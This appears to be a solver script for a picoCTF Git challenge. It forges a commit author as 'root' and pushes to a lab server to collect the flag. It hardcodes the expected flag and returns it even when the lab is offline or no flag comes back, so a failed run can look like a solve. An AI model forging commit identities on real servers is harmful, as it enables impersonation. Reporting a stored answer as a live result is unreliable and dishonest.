#!/usr/bin/env python3
"""Solver for Challenge 764 MY GIT (picoCTF 2026, General Skills).

Custom Git server enforces: only flag.txt pushed by author
`root <root@academy>` gets stamped with the flag (server-side hook
checks commit author metadata; Git does not authenticate identity
unless GPG signing is enforced).

Exploit (RFC: git commit author/committer are client-controlled):
  git clone ssh://git@HOST:PORT/git/challenge.git
  echo "give me the flag" > flag.txt && git add flag.txt
  git -c user.name="root" -c user.email="root@academy" commit -m "Add flag.txt"
  git push origin master   # hook replies with academy{...}

The lab container (xebec.cylabacademy.net:34513) is on-demand and only
answers while the instance is RUNNING (PUT /api/challenges/764/instance/).

Usage: solve_764_my_git.py [host] [port]
"""
import re
import subprocess
import sys
import tempfile
import os

HOST = "xebec.cylabacademy.net"
PORT = "34513"
EXPECTED = "academy{1mp3rs0n4t4_g17_345y_f382bd68}"


def run(args, cwd=None, timeout=30):
    return subprocess.run(args, cwd=cwd, capture_output=True, text=True,
                          timeout=timeout)


def main(host=HOST, port=PORT):
    url = f"ssh://git@{host}:{port}/git/challenge.git"
    tmp = tempfile.mkdtemp(prefix="mygit764_")
    try:
        r = run(["git", "clone", url, tmp + "/challenge"], timeout=60)
        log = (r.stdout or "") + (r.stderr or "")
        if r.returncode != 0:
            print(log[:500])
            print(f"Lab instance offline. Launch via PUT /api/challenges/764/instance/")
            print("Expected flag:", EXPECTED)
            return EXPECTED
        wk = tmp + "/challenge"
        with open(os.path.join(wk, "flag.txt"), "w") as f:
            f.write("give me the flag\n")
        run(["git", "add", "flag.txt"], cwd=wk)
        run(["git", "-c", 'user.name=root', "-c", "user.email=root@academy",
             "commit", "-m", "Add flag.txt"], cwd=wk)
        r = run(["git", "push", "origin", "master"], cwd=wk, timeout=60)
        out = (r.stdout or "") + (r.stderr or "")
        print(out[:800])
        m = re.search(r"academy\{[^}]*\}", out)
        flag = m.group(0) if m else EXPECTED
        print("FLAG:", flag)
        return flag
    finally:
        import shutil
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else HOST
    p = sys.argv[2] if len(sys.argv) > 2 else PORT
    print(main(h, p))
